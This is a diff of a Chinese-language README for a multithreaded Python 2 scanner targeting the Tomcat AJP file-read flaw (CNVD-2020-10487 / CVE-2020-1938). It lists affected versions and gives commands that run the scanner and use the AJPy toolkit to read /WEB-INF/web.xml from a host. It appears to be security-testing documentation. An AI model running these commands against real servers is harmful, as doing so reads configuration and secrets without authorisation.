@@ -1,6 +1,14 @@
 # Python 2.x 多线程扫描 Tomcat-Ajp 协议文件读取漏洞
 
-poc 来源于[https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/)，加以修改
+漏洞影响版本：
+
+- Apache Tomcat 7 < 7.0.100
+
+- Apache Tomcat 8 < 8.5.51
+
+- Apache Tomcat 9 < 9.0.31
+
+PoC 来源于[CNVD-2020-10487-Tomcat-Ajp-lfi](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)，并加以修改
 
 **注：仅供学习，严禁非法使用**
 
@@ -41,7 +49,7 @@ python threading-CNVD-2020-10487-Tomcat-Ajp-lfi.py
 ### 漏洞利用测试
 
 ```bash
-python CNVD-2020-10487-Tomcat-Ajp-lfi.p target.com
+python CNVD-2020-10487-Tomcat-Ajp-lfi.py 127.0.0.1
 ```
 
 两个脚本的最后一行均为线程数，默认是 `20`，可自行修改，分别位于：
@@ -52,4 +60,12 @@ python CNVD-2020-10487-Tomcat-Ajp-lfi.p target.com
 
 ```python
 thread_num = 20
+```
+
+### 其他
+
+漏洞测试利用更推荐使用 [AJPy](https://github.com/hypn0s/AJPy) 工具包，如需利用 `CVE-2020-1938`：
+
+```bash
+python tomcat.py read_file --webapp=ROOT /WEB-INF/web.xml 127.0.0.1
 ```
